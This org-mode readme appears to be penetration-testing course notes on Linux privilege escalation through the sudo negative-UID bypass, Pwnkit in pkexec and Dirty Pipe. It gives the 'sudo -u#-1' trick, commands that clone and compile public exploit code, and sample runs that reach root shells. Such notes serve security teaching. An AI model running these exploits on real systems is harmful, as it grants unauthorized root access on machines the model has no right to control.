readme.org
*** Sudo Policy Bypass
Another vulnerability was found in 2019 that affected all versions below ~1.8.28~, which allowed privileges to escalate even with a simple command. This vulnerability has the CVE-2019-14287 and requires only a single prerequisite. It had to allow a user in the ~/etc/sudoers~ file to execute a specific command.
#+BEGIN_SRC bash
  sudo -l
  [sudo] password for cry0l1t3: **********

  User cry0l1t3 may run the following commands on Penny:
  ALL=(ALL) /usr/bin/id
#+END_SRC

In fact, ~Sudo~ also allows commands with specific user IDs to be executed, which executes the command with the user's privileges carrying the specified ID. The ID of the specific user can be read from the ~/etc/passwd~ file.
#+BEGIN_SRC bash
  cat /etc/passwd | grep cry0l1t3

  cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
#+END_SRC

Thus the ID for the user ~cry0l1t3~ would be ~1005~. If a negative ID (~-1~) is entered at ~sudo~, this results in processing the ID ~0~, which only the ~root~ has. This, therefore, led to the immediate root shell.
#+BEGIN_SRC bash
  sudo -u#-1 id
#+END_SRC
** Polkit
PolicyKit (~polkit~) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so.
Polkit works with two groups of files.
1.   actions/policies (~/usr/share/polkit-1/actions~)
2.   rules (~/usr/share/polkit-1/rules.d~)

Polkit also has ~local authority~ rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory ~/etc/polkit-1/localauthority/50-local.d~ with the file extension ~.pkla~.

PolKit also comes with three additional programs:
1.   ~pkexec~ - runs a program with the rights of another user or with root rights
2.   ~pkaction~ - can be used to display actions
3.   ~pkcheck~ - this can be used to check if a process is authorized for a specific action

The most interesting tool for us, in this case, is ~pkexec~ because it performs the same task as ~sudo~ and can run a program with the rights of another user or root.
#+BEGIN_SRC bash
  pkexec -u <user> <command>
  pkexec -u root id

  uid=0(root) gid=0(root) groups=0(root)
#+END_SRC

In the ~pkexec~ tool, the memory corruption vulnerability with the identifier [[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034][CVE-2021-4034]] was found, also known as Pwnkit and also leads to privilege escalation. This vulnerability was also hidden for more than ten years, and no one can precisely say when it was discovered and exploited. Finally, in November 2021, this vulnerability was published and fixed two months later.

To exploit this vulnerability, we need to download a [[https://github.com/arthepsy/CVE-2021-4034][PoC]] and compile it on the target system itself or a copy we have made.
#+BEGIN_SRC bash
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
#+END_SRC

Once we have compiled the code, we can execute it without further ado. After the execution, we change from the standard shell (~sh~) to Bash (~bash~) and check the user's IDs.
#+BEGIN_SRC bash
  ./poc

  # id

  uid=0(root) gid=0(root) groups=0(root)
#+END_SRC
** Dirty Pipe

A vulnerability in the Linux kernel, named Dirty Pipe (CVE-2022-0847), allows unauthorized writing to root user files on Linux. Technically, the vulnerability is similar to the Dirty Cow vulnerability discovered in 2016. All kernels from version ~5.8~ to ~5.17~ are affected and vulnerable to this vulnerability.

In simple terms, this vulnerability allows a user to write to arbitrary files as long as he has read access to these files. It is also interesting to note that Android phones are also affected. Android apps run with user rights, so a malicious or compromised app could take over the phone.

This vulnerability is based on pipes. Pipes are a mechanism of unidirectional communication between processes that are particularly popular on Unix systems. For example, we could edit the ~/etc/passwd~ file and remove the password prompt for the root. This would allow us to log in with the ~su~ command without the password prompt.

To exploit this vulnerability, we need to download a PoC and compile it on the target system itself or a copy we have made.

_Download Dirty Pipe Exploit_
#+BEGIN_SRC bash
  git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
  cd CVE-2022-0847-DirtyPipe-Exploits
  bash compile.sh
#+END_SRC

After compiling the code, we have two different exploits available. The first exploit version (~exploit-1~) modifies the ~/etc/passwd~ and gives us a prompt with root privileges. For this, we need to verify the kernel version and then execute the exploit.

_Verify Kernel Version_
#+BEGIN_SRC bash
  uname -r

  5.13.0-46-generic
#+END_SRC

_Exploitation_
#+BEGIN_SRC bash
  ./exploit-1

  Backing up /etc/passwd to /tmp/passwd.bak ...
  Setting root password to "piped"...
  Password: Restoring /etc/passwd from /tmp/passwd.bak...
  Done! Popping shell... (run commands now)

  id

  uid=0(root) gid=0(root) groups=0(root)
#+END_SRC

With the help of the 2nd exploit version (~exploit-2~), we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries. For this, we can use the following command:

_Find SUID Binaries_
#+BEGIN_SRC bash
  find / -perm -4000 2>/dev/null

  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /usr/lib/openssh/ssh-keysign
  /usr/lib/snapd/snap-confine
  /usr/lib/policykit-1/polkit-agent-helper-1
  /usr/lib/eject/dmcrypt-get-device
  /usr/lib/xorg/Xorg.wrap
  /usr/sbin/pppd
  /usr/bin/chfn
  /usr/bin/su
  /usr/bin/chsh
  /usr/bin/umount
  /usr/bin/passwd
  /usr/bin/fusermount
  /usr/bin/sudo
  /usr/bin/vmware-user-suid-wrapper
  /usr/bin/gpasswd
  /usr/bin/mount
  /usr/bin/pkexec
  /usr/bin/newgrp
#+END_SRC

Then we can choose a binary and specify the full path of the binary as an argument for the exploit and execute it.

_Exploitation_
#+BEGIN_SRC bash
  ./exploit-2 /usr/bin/sudo

  [+] hijacking suid binary..
  [+] dropping suid shell..
  [+] restoring suid binary..
  [+] popping root shell.. (dont forget to clean up /tmp/sh ;))

  # id

  uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)
#+END_SRC
